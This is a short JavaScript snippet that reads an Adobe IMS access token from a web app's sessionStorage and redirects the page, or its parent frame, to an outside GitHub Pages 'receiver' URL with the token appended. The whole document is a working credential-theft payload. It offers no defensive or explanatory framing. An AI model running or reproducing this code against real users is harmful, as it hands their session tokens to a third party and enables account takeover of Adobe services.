(function() {
    try {
      // The exact sessionStorage key name
      const key = "adobeid_ims_access_token/projectx_webapp/false/AdobeID,DCAPI,ab.manage,account_cluster.read,additional_info.auth_source,additional_info.authenticatingAccount,additional_info.optionalAgreements,additional_info.ownerOrg,additional_info.projectedProductContext,additional_info.roles,additional_info.roles,adobeio.appregistry.read,adobeio.appregistry.write,af_byof,af_ltd_projectx,creative_cloud,creative_sdk,eduprofile.read,eduprofile.write,firefly_api,indesign_services,openid,pps.delete,pps.image_write,pps.read,pps.write,read_organizations,stk.a.license_skip.r,stk.a.limited_license.cru,tk_platform,tk_platform_grant_free_subscription,tk_platform_sync,uds_read,uds_write,unified_dev_portal";
  
      // Grab the raw value
      const raw = sessionStorage.getItem(key);
      if (!raw) {
        console.error("No sessionStorage value found for key:", key);
        return;
      }
  
      // Parse JSON
      const parsed = JSON.parse(raw);
      if (!parsed.tokenValue) {
        console.error("tokenValue not found in stored object");
        return;
      }
  
      const token = parsed.tokenValue;
  
      // Redirect parent window
      const newUrl = "https://mrhavit.github.io/receiver?token=" + encodeURIComponent(token);
      if (window.parent && window.parent !== window) {
        window.parent.location.href = newUrl;
      } else {
        window.location.href = newUrl;
      }
    } catch (err) {
      console.error("Error extracting token:", err);
    }
  })();  